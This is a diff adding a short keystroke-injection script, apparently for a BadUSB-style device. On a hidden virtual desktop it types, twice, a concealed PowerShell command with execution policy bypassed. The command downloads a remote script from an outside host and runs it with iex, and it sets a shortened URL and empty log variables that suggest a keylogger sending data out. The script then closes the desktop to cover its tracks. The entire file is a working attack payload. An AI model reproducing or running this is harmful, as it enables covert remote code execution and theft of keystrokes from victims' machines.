@@ -1,0 +1,35 @@
+GUI-CTRL d
+
+DELAY 1200
+
+NUMLOCK
+
+GUI r
+
+ALTSTRING powershell -w h -NoP -Ep Bypass -command "$dc='https://clck.ru/3CR97W';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
+
+DELAY 1000
+
+ENTER
+DELAY 500
+ENTER
+
+NUMLOCK
+
+
+GUI r
+
+ALTSTRING powershell -w h -NoP -Ep Bypass -command "$dc='https://clck.ru/3CR97W';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
+
+DELAY 800
+
+ENTER
+DELAY 500
+ENTER
+
+
+DELAY 1000
+
+
+GUI-CTRL F4
+
